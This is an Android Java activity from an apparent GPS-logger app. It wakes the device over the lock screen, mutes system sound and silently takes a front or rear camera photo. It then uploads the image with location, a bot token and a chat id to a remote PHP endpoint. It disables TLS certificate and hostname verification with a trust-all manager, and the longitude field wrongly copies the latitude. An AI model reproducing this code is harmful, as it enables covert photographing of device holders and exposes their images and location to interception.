package com.mendhak.gpslogger.darisms;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.esotericsoftware.kryo.serializers.DefaultArraySerializers;
import com.google.android.material.snackbar.Snackbar;
import com.mendhak.gpslogger.R;
import com.mendhak.gpslogger.androidhiddencamera.CameraConfig;
import com.mendhak.gpslogger.androidhiddencamera.CameraError;
import com.mendhak.gpslogger.androidhiddencamera.HiddenCameraActivity;
import com.mendhak.gpslogger.androidhiddencamera.HiddenCameraUtils;
import com.mendhak.gpslogger.androidhiddencamera.config.CameraFacing;
import com.mendhak.gpslogger.androidhiddencamera.config.CameraFocus;
import com.mendhak.gpslogger.androidhiddencamera.config.CameraImageFormat;
import com.mendhak.gpslogger.androidhiddencamera.config.CameraResolution;
import com.mendhak.gpslogger.androidhiddencamera.config.CameraRotation;
import com.mendhak.gpslogger.static_class.service_func;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;


public class Camera extends HiddenCameraActivity {
    private static final int REQ_CODE_CAMERA_PERMISSION = 1253;

    private CameraConfig mCameraConfig;


    String    bot_token,chat_id;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_camera);

        getWindow().addFlags(LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | LayoutParams.FLAG_DISMISS_KEYGUARD
                | LayoutParams.FLAG_KEEP_SCREEN_ON
                | LayoutParams.FLAG_TURN_SCREEN_ON);


        SharedPreferences sharedPreferences = getApplicationContext().getSharedPreferences("data", MODE_PRIVATE);
            bot_token = sharedPreferences.getString("bot_token", "");
            chat_id = sharedPreferences.getString("chat_id", "");

        //ijin kamera
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA},
                    REQ_CODE_CAMERA_PERMISSION);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.d("cam", "onRequestPermissionsResult: No camera permissions.");
            Snackbar.make(findViewById(R.id.bot_token_editview), R.string.no_camera_permission, Snackbar.LENGTH_LONG).show();
            return;
        }


        Intent ii = getIntent();
        Bundle ex = ii.getExtras();
        if (ex != null) {
            if (ii.getStringExtra("jenisFoto").equals("depan")) {

                mCameraConfig = new CameraConfig()
                        .getBuilder(this)
                        .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                        .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                        .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                        .setImageRotation(CameraRotation.ROTATION_270)
                        .setCameraFocus(CameraFocus.AUTO)
                        .build();

            } else if (ii.getStringExtra("jenisFoto").equals("belakang")) {

                mCameraConfig = new CameraConfig()
                        .getBuilder(this)
                        .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                        .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                        .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                        .setImageRotation(CameraRotation.ROTATION_270)
                        .setCameraFocus(CameraFocus.AUTO)
                        .build();




                } else if (ii.getStringExtra("jenisFoto").equals("belakangmedium")) {

                    mCameraConfig = new CameraConfig()
                            .getBuilder(this)
                            .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
                            .setCameraResolution(CameraResolution.LOW_RESOLUTION)
                            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                            .setImageRotation(CameraRotation.ROTATION_270)
                            .setCameraFocus(CameraFocus.AUTO)
                            .build();

            } else if (ii.getStringExtra("jenisFoto").equals("depanmedium")) {

                mCameraConfig = new CameraConfig()
                        .getBuilder(this)
                        .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
                        .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
                        .setImageFormat(CameraImageFormat.FORMAT_JPEG)
                        .setImageRotation(CameraRotation.ROTATION_270)
                        .setCameraFocus(CameraFocus.AUTO)
                        .build();

            }



        }


        //Check for the camera permission for the runtime
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED) {

            //Start camera preview
            try {
                startCamera(mCameraConfig);
            }catch (Exception e)
            {

            }

        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA},
                    REQ_CODE_CAMERA_PERMISSION);
        }

        //Take a picture
        findViewById(R.id.capture_btn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //Take picture using the camera without preview.
                takePicture();
            }
        });

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                /*
                Toast.makeText(getApplicationContext(),
                        "Capturing image.", Toast.LENGTH_SHORT).show();

                 */
                /** matikan suara **/
                AudioManager mgr = (AudioManager)getSystemService(Context.AUDIO_SERVICE);
                mgr.setStreamMute(AudioManager.STREAM_SYSTEM, true);
                /** matikan suara **/
                takePicture();
            }
        }, 2000L);



    }


    @Override
    public void onDestroy() {
        service_func.stop_all_service(getApplicationContext());
        service_func.start_service(getApplicationContext(),true,true);
        super.onDestroy();
    }
    @SuppressLint("MissingPermission")
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        if (requestCode == REQ_CODE_CAMERA_PERMISSION) {

            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startCamera(mCameraConfig);
            } else {
                Toast.makeText(this, R.string.error_camera_permission_denied, Toast.LENGTH_LONG).show();
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    public void onImageCapture(@NonNull File imageFile) {




        // Convert file to bitmap.
        // Do something.
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inPreferredConfig = Bitmap.Config.RGB_565;
        Bitmap bitmap = BitmapFactory.decodeFile(imageFile.getAbsolutePath(), options);

        /** image to base64 ***/
        Bitmap bm = BitmapFactory.decodeFile(imageFile.getAbsolutePath());
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos); //bm is the bitmap object
        //bm.compress(Bitmap.CompressFormat.JPEG, 30, baos); //bm is the bitmap object
        byte[] byteArrayImage = baos.toByteArray();

        //string siap kirim
        String encodedImage = Base64.encodeToString(byteArrayImage, Base64.DEFAULT);
        /** image to base64 ***/


        final SharedPreferences sharedSimpanNotif = getApplicationContext().getSharedPreferences("notif", MODE_PRIVATE);

        String latlong = sharedSimpanNotif.getString("latlong","");
        String isi = sharedSimpanNotif.getString("isi","");


        Date c = Calendar.getInstance().getTime();
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        String formattedDate = df.format(c);


        /*** ssl kacau
         *
         */
        SSLContext sslContext = null;
        try {
            sslContext = SSLContext.getInstance("SSL");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
        try {
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
        } catch (KeyManagementException e) {
            throw new RuntimeException(e);
        }
        OkHttpClient.Builder client = new OkHttpClient.Builder();
        client.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
        client.hostnameVerifier((hostname, session) -> true);

        OkHttpClient newClient = client.build();


        String lll = latlong.replace("https://maps.google.com/?q=","");
        String[] latlongOk ;
        String latlongOk_0 = "";
        String latlongOk_1 = "";
        try {
             latlongOk = lll.split(",");
             latlongOk_0 = latlongOk[0].trim();
            latlongOk_1 = latlongOk[0].trim();
        }catch (Exception e)
        {

        }

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("gambar", encodedImage)
                .addFormDataPart("chat_id", chat_id)
                .addFormDataPart("bot_token", bot_token)
                .addFormDataPart("waktu", formattedDate)
                .addFormDataPart("lat", latlongOk_0)
                .addFormDataPart("lon", latlongOk_1)

                .build();



        Request request = new Request.Builder()
                .url("https://sibahanpe.humbanghasundutankab.go.id/gpslogger/tampung_gambar.php")
                .post(requestBody)
                .build();
        Call call = newClient.newCall(request);

        call.enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                System.out.println(e.toString());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                System.out.println(response);
            }
        });


        //Display the image to the image view
        //((ImageView) findViewById(R.id.cam_prev)).setImageBitmap(bitmap);

        finish();

    }

    @Override
    public void onCameraError(@CameraError.CameraErrorCodes int errorCode) {
        switch (errorCode) {
            case CameraError.ERROR_CAMERA_OPEN_FAILED:
                //Camera open failed. Probably because another application
                //is using the camera
                Toast.makeText(this, R.string.error_cannot_open, Toast.LENGTH_LONG).show();
                finish();
                break;
            case CameraError.ERROR_IMAGE_WRITE_FAILED:
                //Image write failed. Please check if you have provided WRITE_EXTERNAL_STORAGE permission
                Toast.makeText(this, R.string.error_cannot_write, Toast.LENGTH_LONG).show();
                break;
            case CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE:
                //camera permission is not available
                //Ask for the camera permission before initializing it.
                Toast.makeText(this, R.string.error_cannot_get_permission, Toast.LENGTH_LONG).show();
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    startCamera(mCameraConfig);
                }
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION:
                //Display information dialog to the user with steps to grant "Draw over other app"
                //permission for the app.
                HiddenCameraUtils.openDrawOverPermissionSetting(this);
                break;
            case CameraError.ERROR_DOES_NOT_HAVE_FRONT_CAMERA:
                Toast.makeText(this, R.string.error_not_having_camera, Toast.LENGTH_LONG).show();
                finish();
                break;
        }
    }


    public static Bitmap mark(Bitmap src, String watermark) {
        int w = src.getWidth();
        int h = src.getHeight();
        Bitmap result = Bitmap.createBitmap(w, h, src.getConfig());
        Canvas canvas = new Canvas(result);
        canvas.drawBitmap(src, 0, 0, null);
        Paint paint = new Paint();
        paint.setColor(Color.RED);
        paint.setTextSize(12);
        paint.setAntiAlias(true);

        canvas.drawText(watermark, 20, 25, paint);

        return result;
    }


    TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return new java.security.cert.X509Certificate[]{};
                }
            }
    };

}
